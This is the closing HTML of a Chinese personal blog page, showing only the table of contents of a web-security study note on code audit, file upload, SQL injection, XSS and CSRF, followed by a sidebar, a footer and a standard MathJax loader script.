href="#3-1-%E5%88%97%E5%87%BA%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1 列出源码文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%90%9C%E7%B4%A2%E8%BE%93%E5%85%A5%E7%82%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2 搜索输入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%90%9C%E7%B4%A2%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3 搜索危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E6%A3%80%E6%9F%A5-PHP-%E8%AF%AD%E6%B3%95"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4 检查 PHP 语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-Semgrep-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F"><span class="toc-number">1.4.5.</span> <span class="toc-text">3.5 Semgrep 自动扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.6.</span> <span class="toc-text">3.6 代码审计流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">4. 文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%85%88%E7%94%A8%E6%99%AE%E9%80%9A%E6%96%87%E4%BB%B6%E5%BB%BA%E7%AB%8B%E5%9F%BA%E7%BA%BF"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1 先用普通文件建立基线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E4%BF%AE%E6%94%B9%E4%B8%8A%E4%BC%A0%E7%9A%84-Content-Type"><span class="toc-number">1.5.2.</span> <span class="toc-text">4.2 修改上传的 Content-Type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E4%BF%AE%E6%94%B9%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.5.3.</span> <span class="toc-text">4.3 修改上传文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E7%9C%9F%E5%AE%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.4 检查文件真实类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5"><span class="toc-number">1.5.5.</span> <span class="toc-text">4.5 图片文件检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%AE%A1%E7%AE%97%E6%96%87%E4%BB%B6%E5%93%88%E5%B8%8C"><span class="toc-number">1.5.6.</span> <span class="toc-text">4.6 计算文件哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E8%AE%BF%E9%97%AE%E4%B8%8A%E4%BC%A0%E7%BB%93%E6%9E%9C"><span class="toc-number">1.5.7.</span> <span class="toc-text">4.7 访问上传结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.8.</span> <span class="toc-text">4.8 文件上传题判断流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-9-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.5.9.</span> <span class="toc-text">4.9 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">5. 注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E8%AE%B0%E5%BD%95%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82"><span class="toc-number">1.6.1.</span> <span class="toc-text">5.1 记录正常请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E6%AF%94%E8%BE%83%E7%9C%9F%E5%81%87%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.6.2.</span> <span class="toc-text">5.2 比较真假条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.6.3.</span> <span class="toc-text">5.3 判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E6%9F%A5%E6%89%BE%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-number">1.6.4.</span> <span class="toc-text">5.4 查找显示位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.5.</span> <span class="toc-text">5.5 查询数据库基础信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.6.</span> <span class="toc-text">5.6 报错注入函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-7-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.7.</span> <span class="toc-text">5.7 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.8.</span> <span class="toc-text">5.8 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-9-SQLMap"><span class="toc-number">1.6.9.</span> <span class="toc-text">5.9 SQLMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-10-POST-%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.10.</span> <span class="toc-text">5.10 POST 参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-11-Cookie-Header-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.11.</span> <span class="toc-text">5.11 Cookie&#x2F;Header 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-12-MySQL-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.6.12.</span> <span class="toc-text">5.12 MySQL 客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-13-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">1.6.13.</span> <span class="toc-text">5.13 注入防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">6. XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%9C%80%E5%B0%8F%E5%BC%B9%E7%AA%97%E6%B5%8B%E8%AF%95"><span class="toc-number">1.7.1.</span> <span class="toc-text">6.1 最小弹窗测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E6%9F%A5%E7%9C%8B%E8%BE%93%E5%85%A5%E8%BF%9B%E5%85%A5%E5%93%AA%E7%A7%8D%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">1.7.2.</span> <span class="toc-text">6.2 查看输入进入哪种上下文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E7%94%A8-curl-%E6%8F%90%E4%BA%A4-GET-%E5%8F%82%E6%95%B0"><span class="toc-number">1.7.3.</span> <span class="toc-text">6.3 用 curl 提交 GET 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-%E7%94%A8-curl-%E6%8F%90%E4%BA%A4-POST-%E5%8F%82%E6%95%B0"><span class="toc-number">1.7.4.</span> <span class="toc-text">6.4 用 curl 提交 POST 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-%E4%BF%9D%E5%AD%98%E5%93%8D%E5%BA%94%E5%B9%B6%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%86%85%E5%AE%B9"><span class="toc-number">1.7.5.</span> <span class="toc-text">6.5 保存响应并搜索关键内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-6-URL-%E7%BC%96%E7%A0%81"><span class="toc-number">1.7.6.</span> <span class="toc-text">6.6 URL 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-7-XSS-%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.7.</span> <span class="toc-text">6.7 XSS 的三种类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-8-%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.7.8.</span> <span class="toc-text">6.8 修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-CSRF-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">7. CSRF 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E6%A3%80%E6%9F%A5-Cookie"><span class="toc-number">1.8.1.</span> <span class="toc-text">7.1 检查 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E6%90%BA%E5%B8%A6-Cookie-%E8%AF%B7%E6%B1%82%E8%B4%A6%E6%88%B7%E9%A1%B5"><span class="toc-number">1.8.2.</span> <span class="toc-text">7.2 携带 Cookie 请求账户页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E6%A3%80%E6%9F%A5%E6%95%8F%E6%84%9F%E6%93%8D%E4%BD%9C%E6%98%AF%E5%90%A6%E6%9C%89-Token"><span class="toc-number">1.8.3.</span> <span class="toc-text">7.3 检查敏感操作是否有 Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E6%A3%80%E6%9F%A5-GET-%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE"><span class="toc-number">1.8.4.</span> <span class="toc-text">7.4 检查 GET 修改数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5-%E6%A3%80%E6%9F%A5-POST-%E8%AF%B7%E6%B1%82"><span class="toc-number">1.8.5.</span> <span class="toc-text">7.5 检查 POST 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-6-%E6%9F%A5%E7%9C%8B-Cookie-%E7%9A%84-SameSite"><span class="toc-number">1.8.6.</span> <span class="toc-text">7.6 查看 Cookie 的 SameSite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-7-%E6%A3%80%E6%9F%A5-Origin-%E5%92%8C-Referer"><span class="toc-number">1.8.7.</span> <span class="toc-text">7.7 检查 Origin 和 Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-8-%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB%E8%80%85%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.8.8.</span> <span class="toc-text">7.8 本地模拟攻击者页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-9-%E5%88%A4%E6%96%AD-CSRF-%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.8.9.</span> <span class="toc-text">7.9 判断 CSRF 的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-10-%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.8.10.</span> <span class="toc-text">7.10 修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%B8%B8%E7%94%A8%E6%8E%92%E6%9F%A5%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.9.</span> <span class="toc-text">8. 常用排查速查表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E5%9C%B0%E5%9D%80%E6%88%96%E8%B7%AF%E5%BE%84"><span class="toc-number">1.9.1.</span> <span class="toc-text">8.1 地址或路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E7%9B%AE%E5%BD%95%E5%92%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.9.2.</span> <span class="toc-text">8.2 目录和文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-%E6%BA%90%E7%A0%81"><span class="toc-number">1.9.3.</span> <span class="toc-text">8.3 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.9.4.</span> <span class="toc-text">8.4 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-5-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.5.</span> <span class="toc-text">8.5 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-6-XSS"><span class="toc-number">1.9.6.</span> <span class="toc-text">8.6 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-7-CSRF"><span class="toc-number">1.9.7.</span> <span class="toc-text">8.7 CSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%AE%9E%E6%93%8D%E9%A2%98%E6%A0%87%E5%87%86%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.</span> <span class="toc-text">9. 实操题标准答题模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.1.</span> <span class="toc-text">信息收集模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.2.</span> <span class="toc-text">代码审计模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.3.</span> <span class="toc-text">文件上传模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.4.</span> <span class="toc-text">注入模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.5.</span> <span class="toc-text">XSS 模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.6.</span> <span class="toc-text">CSRF 模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%9C%80%E5%90%8E%E7%9A%84%E9%AB%98%E9%A2%91%E5%88%A4%E6%96%AD"><span class="toc-number">1.11.</span> <span class="toc-text">10. 最后的高频判断</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/" title="数据警务社纳新笔记">数据警务社纳新笔记</a><time datetime="2026-11-21T09:53:47.000Z" title="发表于 2026-11-21 17:53:47">2026-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/20/SQLmap/" title="SQLmap">SQLmap</a><time datetime="2026-11-20T14:16:27.000Z" title="发表于 2026-11-20 22:16:27">2026-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/19/%E7%BD%91%E5%AE%89%E7%A4%BEweb%E5%AD%A6%E4%B9%A0/" title="网安社web学习">网安社web学习</a><time datetime="2026-11-19T01:24:40.000Z" title="发表于 2026-11-19 09:24:40">2026-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/19/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="SQL学习笔记">SQL学习笔记</a><time datetime="2026-11-19T01:07:54.000Z" title="发表于 2026-11-19 09:07:54">2026-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/18/SQLmap-ai/" title="SQLmap ai">SQLmap ai</a><time datetime="2026-11-18T13:39:10.000Z" title="发表于 2026-11-18 21:39:10">2026-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By SpringQin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.1.260810</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.1.260810"></script><script src="/js/main.js?v=5.7.1.260810"></script><div class="js-pjax"><script>(() => {
+  const changeScriptToMath = article => {
+    article.querySelectorAll('script[type^="math/tex"]').forEach(el => {
+      const display = /mode=display/.test(el.type)
+      const node = document.createElement(display ? 'div' : 'span')
+      node.textContent = display
+        ? `$$${el.textContent}$$`
+        : `$${el.textContent}$`
+      el.parentNode.replaceChild(node, el)
+    })
+  }
+
+  const loadMathjax = () => {
+    const article = document.getElementById('article-container')
+    if (!article || article.querySelector('.hbe-container')) return
+    changeScriptToMath(article)
+
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem',
+            'ui/lazy'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          lazyMargin: '200px',
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.3/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.typesetClear()
+      MathJax.typesetPromise([ article ])
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  if (window.pjax) loadMathjax()
+  else if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', loadMathjax)
+  else loadMathjax()
+})()</script></div><script async data-pjax src="https://events.vercount.one/js"></script></div></body></html>
